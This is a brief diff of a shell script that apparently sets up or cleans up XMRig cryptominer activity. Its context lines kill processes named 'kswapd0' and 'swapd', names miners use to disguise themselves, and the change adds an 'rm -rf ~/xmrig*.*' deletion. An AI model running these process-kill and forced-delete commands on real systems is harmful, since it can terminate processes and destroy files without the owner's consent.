@@ -842,4 +842,8 @@ kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2
 kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
 kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
 
+# New addition: Delete xmrig files in login directory
+log_message "Cleaning up xmrig files in login directory..."
+rm -rf ~/xmrig*.*
+
 echo "[*] Setup complete"
